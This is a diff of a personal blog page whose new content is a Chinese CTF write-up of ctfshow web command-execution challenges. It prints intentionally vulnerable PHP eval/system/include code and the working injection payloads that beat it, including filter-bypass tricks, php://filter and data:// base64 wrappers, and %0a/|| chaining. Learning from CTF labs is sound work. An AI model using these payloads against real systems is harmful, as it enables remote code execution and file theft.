@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>php学习day1 | 大周&#39;blog</title>
+  <title>ctfshow-web入门命令执行 | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -269,6 +269,34 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
 <div class="pattern-center-blank"></div>
 
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img">
+        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201120184905.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+      </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      ctfshow-web入门命令执行</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">
+            <img src="https://www.d1a0.cn/images/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">d1a0</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-11-20
+        
+      
+        ·<span id="readcount"></span>次阅读
+      
+      </p>
+    </header>
+  </div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
@@ -276,58 +304,427 @@
         <div class="toc"></div>
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
-          <header class="entry-header">
-            <h1 class="entry-title">php学习day1</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2020-3-12&nbsp;
-              
-                    
-        ·<span id="readcount"></span>次阅读
-      
-            </p>
-            <hr>
-          </header>
-        
         <div class="entry-content">
-          <h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><a id="more"></a>
+          <h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><pre><code>&lt;?php 
 
-<h3 id="常量定义："><a href="#常量定义：" class="headerlink" title="常量定义："></a>常量定义：</h3><p>常量在定义时必须赋值</p>
-<p>define(‘常量名’,常量值)；</p>
-<p>const 常量名 = 常量值;//(php5.3之后)</p>
-<p>常量名命名规则:</p>
-<p>1.常量的名字组成由字母、数字和下划线组成，不能以数字开头</p>
-<p>2.常量的名字通常是以大写字母为主(为了与变量区别)</p>
-<p>3.常量的名字可以使用一些特殊符号(如-_-(只能使用define))</p>
-<p>特殊名字的常量在访问时需要用echo constant(‘常量名’);</p>
-<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><p>系统常量:系统定义，用户可以直接调用。</p>
-<p>常见系统常量:</p>
-<p>PHP_VERSION：PHP版本号</p>
-<p>PHP_INT_SIZE：整形大小</p>
-<p>PHP_INT_MAX：整形能表示的最大值</p>
-<h3 id="特殊常量"><a href="#特殊常量" class="headerlink" title="特殊常量"></a>特殊常量</h3><p>由双下划线开始+常量名+双下划线结束(系统魔术常量)</p>
-<p>会随着环境变化，但无法改变</p>
-<pre><code>__DIR__：当前被执行的脚本所在电脑的绝对路径
-__FILE__：当前被执行的脚本所在电脑的绝对路径（带自己的文件名）
-__LINE__：当前所属的行数
-__NAMESPACE__：当前所属的命名空间
-__CLASS__：当前所属的类
-__METHOD__：当前所属的方法</code></pre><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：data type，在PHP中指的是存储的数据本身的类型，而不是变量的类型。PHP是一种弱类型语言，变量本身没有数据类型。</p>
-<h3 id="PHP的八种数据类型："><a href="#PHP的八种数据类型：" class="headerlink" title="PHP的八种数据类型："></a>PHP的八种数据类型：</h3><p>在PHP中将数据分为三大类八小类</p>
-<h4 id="简单-基本-数据类型：4小类"><a href="#简单-基本-数据类型：4小类" class="headerlink" title="简单(基本)数据类型：4小类"></a>简单(基本)数据类型：4小类</h4><p>整型：int/integer，系统分配4个字节存储，表示整数类型</p>
-<p>浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数</p>
-<p>字符串型：string，系统根据实际长度分配，表示字符串(引号)</p>
-<p>布尔类型：bool/boolean，表示布尔类型，只有两个值：true和false</p>
-<h4 id="复合数据类型：2小类"><a href="#复合数据类型：2小类" class="headerlink" title="复合数据类型：2小类"></a>复合数据类型：2小类</h4><p>对象类型：object，存放对象(面向对象)</p>
-<p>数组类型：array，存储多个数据(一次性)</p>
-<h4 id="特殊数据类型：2小类"><a href="#特殊数据类型：2小类" class="headerlink" title="特殊数据类型：2小类"></a>特殊数据类型：2小类</h4><p>资源类型：resource，存放资源数据(PHP外部数据，如数据库、文件)</p>
-<p>空类型：NULL，只有一个值就是NULL(不能运算)</p>
-<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>1.自动转换：系统根据需求自己判断、自己转换</p>
-<p>2.强制(手动)转换：认为根据需要的目标类型转换</p>
-<p>在转换过程中用的比较多的就是转布尔类型(判断)和转数值类型(算数运算)</p>
-<p><img data-action="zoom" src="/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/QQ截图20200312160116.jpg" alt="QQ截图20200312160116"></p>
-<p>1.布尔true为1，false为0</p>
-<p>2.字符串转数值有自己的规则</p>
-<p>2.1以字母开头的字符串永远为0</p>
-<p>2.2以数字开头的字符串，取到碰到字符串为止(不会同时包含两个小数点)</p>
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:26:48 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>过滤了flag，直接cat *.php</p>
+<p><code>?c=system(‘cat *.php’);</code></p>
+<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:42:26 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|system|php/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>这次过滤了system，用<code>?c=echo shell_exec(&#39;cat fl``ag.p``hp&#39;);</code></p>
+<p>这里我刚开始用<code>?c=echo exec(&#39;ls&#39;);</code>发现只有index.php，并且<code>?c=echo exec(&#39;cat fl``ag.p``hp&#39;);</code>之后也只有$flag = ‘flag{28bba894-7025-47a3-a269-e98f60f6bfce}’;</p>
+<p>问过羽大佬之后才知道是exec和shell_exec的区别，exec只返回结果的最后一行，而shell_exec返回完整结果。</p>
+<p>参考<a href="http://www.manongjc.com/article/1992.html" target="_blank" rel="noopener">http://www.manongjc.com/article/1992.html</a></p>
+<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:49:10 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>过滤了空格和单引号，cat也不能用，用%09代替空格绕过</p>
+<pre><code>?c=echo(`nl%09*`);</code></pre><p>还有几个代替空格的，但是这里没用：${IFS}、$IFS$9、&lt;&gt;、&lt;</p>
+<h3 id="web32-36"><a href="#web32-36" class="headerlink" title="web32-36"></a>web32-36</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:56:31 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>这次直接连echo都直接过滤了，包括括号也过滤了，php中不用括号的函数有echo、print、die、include、require、include_once、require_once,用include函数和post传伪协议构成payload</p>
+<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>后面的33-37基本都差不多，同一个payload</p>
+<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 05:18:55 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+//flag in flag.php 
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
+    include($c); 
+    echo $flag; 
+
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>过滤了flag，然后包含出来，用data协议</p>
+<pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 05:23:36 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+//flag in flag.php 
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|php|file/i&quot;, $c)){ 
+    include($c); 
+    echo $flag; 
+
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>  } </p>
+<p>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}</p>
+<p>在37的基础上过滤了php和file，data协议用base64加密一下</p>
+<pre><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 06:13:21 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+//flag in flag.php 
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
+    include($c.&quot;.php&quot;); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>在之前的基础上加了.php后缀</p>
+<pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 06:03:36 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+} 
+
+</code></pre><p>啥也看不懂，大佬的wp都看不懂，先看羽师傅的wp</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015201529.png" alt></p>
+<p>又是看不懂的东西，首先session_start()函数初始化session，然后引用session_id,构造system(ls);</p>
+<p>俺照着试了试确实能行，但是也确实不能cat flag</p>
+<p>如羽师傅所说<code>因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</code></p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204033.png" alt></p>
+<p>接着看第二个解法读文件+数组改造</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204550.png" alt></p>
+<p>又是一大堆奇奇怪怪的函数，第一个函数localeconv()：查找美国本地的数字格式化信息，返回内容为</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015205007.png" alt></p>
+<p>pos()函数：pos()函数是current()函数的别名，它可返回数组中当前元素的值。在这里它返回了</p>
+<p>localeconv()函数返回数组中的第一个元素.</p>
+<p>scandir():列出指定路径中的文件和目录，这里构造的是scandir(.)。</p>
+<p>现在的返回值是</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211313.png" alt></p>
+<p>array_reverse():返回单元顺序相反的数组，这里的作用就是把两个php文件提到前边</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211429.png" alt></p>
+<p>next()：将数组中的内部指针向前移动一位 ，就是把数组中第二个元素提前一位并且返回，在这里是把flag.php提到第一位并返回</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015212249.png" alt></p>
+<p>然后highlight_file()函数将flag.php中的内容返回</p>
+<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: 羽 
+# @Date:   2020-09-05 20:31:22 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 22:40:07 
+# @email: 1341963450@qq.com 
+# @link: https://ctf.show 
+
+*/ 
+
+if(isset($_POST[&#39;c&#39;])){ 
+    $c = $_POST[&#39;c&#39;]; 
+if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;, $c)){ 
+        eval(&quot;echo($c);&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+} 
+?&gt;</code></pre><p>这个题还是看羽师傅的wp吧<a href="https://wp.ctf.show/d/137-ctfshow-web-web41" target="_blank" rel="noopener">https://wp.ctf.show/d/137-ctfshow-web-web41</a></p>
+<p>这个里边贴了个rce_or.php和exp.py，将这两个文件放在一起，然后在powershell里边</p>
+<pre><code>python exp.py url</code></pre><p>python exp.py <a href="http://c47ca7f9-4c4f-4dde-8391-aa40c7496adf.chall.ctf.show/" target="_blank" rel="noopener">http://c47ca7f9-4c4f-4dde-8391-aa40c7496adf.chall.ctf.show/</a></p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201027220725.png" alt></p>
+<p>就这么用，具体自己研究研究，俺也没弄太懂，还要再瞅瞅</p>
+<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 20:51:55 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
+}else{ 
+    highlight_file(__FILE__); 
+}</code></pre><p>关键代码<code>&gt;/dev/null 2&gt;&amp;1</code></p>
+<pre><code>&gt;/dev/null 2&gt;&amp;1
+//会将标准输出，错误输出都重定向至/dev/null，也就是全部丢弃</code></pre><p>也就是说所有的输出都被丢弃了</p>
+<p>payload：</p>
+<p><code>?c=ls%0a</code></p>
+<p><code>?c=cat%20flag.php%0a</code></p>
+<p>这里用%0a换行，还有用;分割，||分割。</p>
+<p>参考资料：</p>
+<p><a href="https://blog.csdn.net/qq_32419007/article/details/80187962" target="_blank" rel="noopener">https://blog.csdn.net/qq_32419007/article/details/80187962</a></p>
+<p><a href="https://blog.csdn.net/xiaoABClong/article/details/95973140" target="_blank" rel="noopener">https://blog.csdn.net/xiaoABClong/article/details/95973140</a></p>
+<p>还有atao师傅的这篇文章，总结的超级好(膜！)：</p>
+<p><a href="https://www.cnblogs.com/erR0Ratao/p/13640600.html" target="_blank" rel="noopener">https://www.cnblogs.com/erR0Ratao/p/13640600.html</a></p>
+<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 21:32:51 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|cat/i&quot;, $c)){ 
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+}</code></pre><p>emm。。过滤了;可以用%0a和||，过滤了cat可以用nl</p>
+<p>payload：</p>
+<p><code>?c=ls||</code></p>
+<p><code>?c=nl%20flag.php||</code></p>
+<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 21:32:01 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c)){ 
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+}</code></pre><p>又把flag过滤了，可以用*</p>
+<p>payload：</p>
+<p><code>?c=ls||</code></p>
+<p><code>?c=nl%20fl*g.php||</code>或者是</p>
+<pre><code>?c=nl%20`ls`||</code></pre><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 21:35:34 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c)){ 
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+}</code></pre><p>这个把空格也过滤了，用空格绕过$IFS之类的，具体参考上边atao师傅的博客</p>
+<p>payload：</p>
+<pre><code>nl$IFS`ls`||</code></pre><p>这里有一点很奇怪，*通配符不能与IFS或&lt;不能一起使用</p>
+<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 21:50:19 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c)){ 
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+}</code></pre><p>又把$过滤了，就用&lt;绕过</p>
+<pre><code>?c=nl&lt;fl``ag.php||</code></pre><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>同上</p>
+<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 22:06:20 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c)){ 
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+} </code></pre><p>禁了反引号用单引号</p>
+<pre><code>?c=nl&lt;fl&#39;&#39;ag.php||</code></pre><h3 id="web49-51"><a href="#web49-51" class="headerlink" title="web49-51"></a>web49-51</h3><p>同上</p>
+<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-05 22:50:30 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){ 
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+} </code></pre><p>&lt;被过滤了，用${IFS}</p>
+<pre><code>?c=nl$IFS/fl&#39;&#39;ag||</code></pre><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
+<p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>
 
         </div>
         <!-- .entry-content -->
@@ -349,39 +746,20 @@ __METHOD__：当前所属的方法</code></pre><h2 id="数据类型"><a href="#�
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/" rel="prev">
-              <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/b3e8dae89b950b940dc0edd1e8cc0566.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                php学习day2</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" rel="next">
+            <a href="/2020/11/20/ctfshow-web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/b3e8dae89b950b940dc0edd1e8cc0566.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201120184619.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                ctfhub-信息泄泄露_备份文件下载</h3>
+                ctfshow-web入门爆破</h3>
                 <hr>
               </div>
             </a>
@@ -405,11 +783,11 @@ __METHOD__：当前所属的方法</code></pre><h2 id="数据类型"><a href="#�
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener" class="profile gravatar"><img src="https://www.d1a0.cn/images/avatar.jpg" itemprop="image" alt="d1a0" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
-            <a href="" itemprop="url" rel="author"></a>
+            <a href="https://www.d1a0.cn" target="_blank" itemprop="url" rel="author noopener">d1a0</a>
             </h3>
           </div>
         </div>
